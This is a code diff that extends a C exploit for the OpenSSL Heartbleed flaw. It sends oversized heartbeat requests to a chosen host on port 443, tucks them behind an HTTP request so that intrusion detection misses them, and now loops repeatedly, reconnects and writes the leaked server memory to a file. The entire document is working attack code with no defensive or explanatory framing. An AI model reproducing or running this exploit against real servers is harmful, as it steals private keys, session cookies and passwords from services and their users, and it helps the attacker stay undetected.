@@ -40,8 +40,13 @@
 #include <WinSock2.h>
 #include <WS2tcpip.h>
 #define snprintf _snprintf
+#define sleep(secs) Sleep(1000*(secs))
 #else
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netdb.h>
 #define WSAGetLastError() (errno)
+#define closesocket(fd) close(fd)
 #endif
 #if defined(_MSC_VER)
 #pragma comment(lib, "ws2_32")
@@ -57,6 +62,13 @@
 #include <openssl/bio.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
+#include <openssl/bio.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+#include <openssl/evp.h>
+#include <openssl/tls1.h>
+#include <openssl/rand.h>
+#include <openssl/buffer.h>
 int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
 
 /*
@@ -64,6 +76,9 @@ int ssl3_write_bytes(SSL *s, int type, const void *buf_, int len);
  */
 #include <stdio.h>
 #include <string.h>
+#include <stdarg.h>
+
+int is_debug = 0;
 
 /**
  * Arguments for the heartbleed callback function
@@ -72,11 +87,35 @@ struct DumpArgs {
     FILE *fp;
     const char *filename;
     const char *hostname;
+    unsigned is_error;
     unsigned loop_count;
     unsigned ip_ver;
     unsigned port;
+    unsigned byte_count;
+    unsigned char buf[65536];
 };
 
+/****************************************************************************
+ ****************************************************************************/
+int ERROR_MSG(const char *fmt, ...)
+{
+    va_list marker;
+    va_start(marker, fmt);
+    vfprintf(stderr, fmt, marker);
+    va_end(marker);
+    return -1;
+}
+
+int DEBUG_MSG(const char *fmt, ...)
+{
+    va_list marker;
+    if (!is_debug)
+        return 0;
+    va_start(marker, fmt);
+    vfprintf(stderr, fmt, marker);
+    va_end(marker);
+    return -1;
+}
 
 /****************************************************************************
  * This is the "callback" that receives the hearbeat data. Since 
@@ -101,6 +140,7 @@ dump_bytes(int write_p, int version, int content_type,
     case SSL3_RT_CHANGE_CIPHER_SPEC: /* 20 */
     case SSL3_RT_HANDSHAKE: /* 22 */
     case SSL3_RT_APPLICATION_DATA: /* 23 */
+    case 256: /* ???? why this? */
         return;
     case SSL3_RT_ALERT: /* 21 */
         printf("[-] ALERT\n");
@@ -108,25 +148,20 @@ dump_bytes(int write_p, int version, int content_type,
     case TLS1_RT_HEARTBEAT:
         break; /* handle below */
     default:
-        fprintf(stderr, "[-] msg_callback:%u: unknown type seen\n", 
-                                                            content_type);
+        ERROR_MSG("[-] msg_callback:%u: unknown type seen\n", content_type);
         return;
     }
 
     /*
      * Inform user that we got some bleeding data
      */
-    printf("[+] %5u-bytes bleed received\n", (unsigned)len);
+    DEBUG_MSG("[+] %5u-bytes bleed received\n", (unsigned)len);
+
 
     /*
-     * Dump binary to a file
+     * Display bytes if not dumping to file
      */
-    if (dumpargs->fp) {
-        int x = fwrite(buf, 1, len, dumpargs->fp);
-        if (x != len) {
-            perror(dumpargs->filename);
-        }
-    } else {
+    if (!dumpargs->fp) {
         size_t i;
     
         /* no file, so print hex dump instead */
@@ -175,12 +210,28 @@ my_inet_ntop(int family, struct sockaddr *sa, char *dst, size_t sizeof_dst)
     return dst;
 }
 
+/****************************************************************************
+ ****************************************************************************/
+void
+process_bleed(struct DumpArgs *args)
+{
+    int x;
+
+    if (args->byte_count == 0)
+        return;
+
+    x = fwrite(args->buf, 1, args->byte_count, args->fp);
+    if (x != args->byte_count) {
+        ERROR_MSG("[-] %s: %s\n", args->filename, strerror(errno));
+    }
+    args->byte_count = 0;
+}
 
 /****************************************************************************
  * This is the main threat that creates a TCP connection, negotiates
  * SSL, and then starts sending queries at the server.
  ****************************************************************************/
-void
+int
 ssl_thread(const char *hostname, struct DumpArgs *args)
 {
     int x;
@@ -231,9 +282,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     fprintf(stderr, "[ ] resolving \"%s\"\n", hostname);
     x =  getaddrinfo(hostname, "443", 0, &addr);
     if (x != 0) {
-        fprintf(stderr, "%s: DNS lookup failed\n", hostname);
-        return;
-    } else {
+        return ERROR_MSG("[-] %s: DNS lookup failed\n", hostname);
+    } else if (is_debug) {
         struct addrinfo *a;
         for (a=addr; a; a = a->ai_next) {
             my_inet_ntop(a->ai_family, a->ai_addr, address, sizeof(address));
@@ -245,10 +295,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
         addr = addr->ai_next;
     while (addr && args->ip_ver == 6 && addr->ai_family != AF_INET6)
         addr = addr->ai_next;
-    if (addr == NULL) {
-        fprintf(stderr, "IPv%u address not found\n", args->ip_ver);
-        return;
-    }
+    if (addr == NULL)
+        return ERROR_MSG("IPv%u address not found\n", args->ip_ver);
     my_inet_ntop(addr->ai_family, addr->ai_addr, address, sizeof(address));
 
     
@@ -257,11 +305,8 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      * Create a normal TCP socket
      */
     fd = socket(addr->ai_family, SOCK_STREAM, 0);
-    if (fd < 0) {
-        fprintf(stderr, "%s:%u: could not create socket\n", 
-                                            hostname, addr->ai_family);
-        return;
-    }
+    if (fd < 0)
+        return ERROR_MSG("%u: could not create socket\n", addr->ai_family);
 
     
     
@@ -272,9 +317,9 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
     fprintf(stderr, "[ ] %s: connecting...\n", address);
     x = connect(fd, addr->ai_addr, addr->ai_addrlen);
     if (x != 0) {
-        fprintf(stderr, "%s: failed to connect, err=%d\n", 
-                                            address, WSAGetLastError());
-        return;
+        ERROR_MSG("%s: connect failed err=%d\n", address, WSAGetLastError());
+        sleep(1);
+        return 0;
     }
     fprintf(stderr, "[+] %s: connected\n", address);
 
@@ -304,7 +349,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
      * use of the API that you'd expect. We have to do do the send()/recv()
      * ourselves on sockets, then pass then through to the SSL layer 
      */
-    fprintf(stderr, "[ ] %s: SSL handshake started...\n", address);
+    DEBUG_MSG("[ ] SSL handshake started...\n");
     for (;;) {
         len = BIO_pending(wbio);
         if (len) {
@@ -313,7 +358,7 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
             BIO_read(wbio, buf, len);
             x = send(fd, buf, len, 0);
             if (x <= 0) {
-                fprintf(stderr, "%s: send fail\n", hostname);
+                ERROR_MSG("[-] %s:%s send fail\n", address, port);
                 goto end;
             }
         }
@@ -341,39 +386,54 @@ ssl_thread(const char *hostname, struct DumpArgs *args)
                 }
             }
         } else {
-            fprintf(stderr, "%s: SSL handshake failed: %d\n", 
-                                        address, SSL_get_error(ssl, 0));
+            ERROR_MSG("[-] %s:%s: SSL handshake failed: %d\n", 
+                                     address, port, SSL_get_error(ssl, 0));
             goto end;
         }
     }
-    fprintf(stderr, "[+] %s: SSL handshake complete [%s]\n", 
-                                        address, SSL_get_cipher(ssl));
+    DEBUG_MSG("[+] %s:%s: SSL handshake complete [%s]\n", 
+                                        address, port, SSL_get_cipher(ssl));
 
     
     
+    /*
+     * Loop many times
+     */
+again:
+    if (args->loop_count-- == 0) {
+        ERROR_MSG("[-] loop-count = 0\n");
+        goto end;
+    }
+
+    /*
+     * If we have a buffer, flush it to the file
+     */
+    if (args->byte_count) {
+        process_bleed(args);
+    }
+
     /* 
      * Send the HTTP request (encrypte) and Heartbeat request. This causes
      * the hearbeat request to happen at the end of the packet instead of the
      * front, thus evading pattern-match IDS
      */
-again:
-    if (--args->loop_count == 0)
-        goto end;
     ssl3_write_bytes(ssl, SSL3_RT_APPLICATION_DATA, 
                             http_request, strlen(http_request));
     ssl3_write_bytes(ssl, TLS1_RT_HEARTBEAT, "\x01\xff\xff", 3);
 
+
+
     /* 
      * Transmit both requests (data and heartbeat) in the same packet
      */
-    fprintf(stderr, "[ ] transmitting requests\n");
+    DEBUG_MSG("[ ] transmitting requests\n");
     while ((len = BIO_pending(wbio)) != 0) {
         if (len > sizeof(buf))
             len = sizeof(buf);
         BIO_read(wbio, buf, len);
         x = send(fd, buf, len, 0);
         if (x <= 0) {
-            fprintf(stderr, "%s: send fail\n", hostname);
+            ERROR_MSG("[-] %s:%s: send fail\n", address, port);
             goto end;
         }
     }
@@ -383,7 +443,7 @@ again:
      * HTTP-layer response, but during the wait, callbacks to the
      * "dump_bytes" function will happen.
      */
-    fprintf(stderr, "[ ] waiting for response\n");
+    DEBUG_MSG("[ ] waiting for response\n");
     for (;;) {
         char buf[65536];
         struct timeval tv;
@@ -403,7 +463,7 @@ again:
                 BIO_write(rbio, buf, x);
             }
         } else if (x < 0) {
-            fprintf(stderr, "[-] socket err=%d\n", WSAGetLastError());
+            ERROR_MSG("[-] socket err=%d\n", WSAGetLastError());
             break;
         }
 
@@ -418,11 +478,12 @@ again:
         else if (x < 0) {
             x = SSL_get_error(ssl, x);
 
-            fprintf(stderr, "[-] SSL error received\n");
+            ERROR_MSG("[-] SSL error received\n");
             ERR_print_errors_fp(stderr);
             break;
         } else if (x > 0) {
-            fprintf(stderr, "[+] %d-bytes data received\n", x);
+            DEBUG_MSG("[+] %d-bytes data received\n", x);
+            if (is_debug)
             if (memcmp(buf, "HTTP/1.", 7) == 0 && strchr(buf, '\n')) {
                 size_t i;
                 fprintf(stderr, "[+] ");
@@ -435,9 +496,8 @@ again:
                         fprintf(stderr, ".");
                 }
                 fprintf(stderr, "\n");
-                goto again;
             }
-                
+            goto again;
         }
     }
 
@@ -445,9 +505,15 @@ again:
      * We've either reached our loop limit or the other side closed the
      * connection
      */
-    fprintf(stderr, "done\n");
+    DEBUG_MSG("[+] connection terminated\n");
 end:
-    return;
+    process_bleed(args);
+    BIO_free_all(rbio);
+    BIO_free_all(wbio);
+    SSL_free(ssl);
+    SSL_CTX_free(ctx);
+    closesocket(fd);
+    return 0;
 }
 
 
@@ -463,6 +529,7 @@ main(int argc, char *argv[])
 
     memset(&args, 0, sizeof(args));
     args.port = 443;
+    args.loop_count = 1;
 
     if (argc <= 1 ) {
 usage:
@@ -515,7 +582,9 @@ usage:
          * -t www.google.com
          */
         c = argv[i][1];
-        if (argv[i][2] == '\0') {
+        if (c == 'd')
+            ;
+        else if (argv[i][2] == '\0') {
             arg = argv[++i];
             if (i >= argc) {
                 fprintf(stderr, "-%c: missing parameter\n", c);
@@ -528,6 +597,9 @@ usage:
          * Get the parameter
          */
         switch (c) {
+        case 'd':
+            is_debug++;
+            break;
         case 't':
             args.hostname = arg;
             break;
@@ -565,7 +637,6 @@ usage:
         fprintf(stderr, "no target specified, use \"-t <hostname>\"\n");
         goto usage;
     }
-    args.loop_count++;
 
     /*
      * Open the file if it exists
@@ -581,7 +652,12 @@ usage:
     /*
      * Now run the thread
      */
-    ssl_thread(args.hostname, &args);
+    while (args.loop_count) {
+        int x;
+        x = ssl_thread(args.hostname, &args);
+        if (x < 0)
+            break;
+    }
 
     /*
      * Finished. We should do a more gracefull close, but I'm lazy
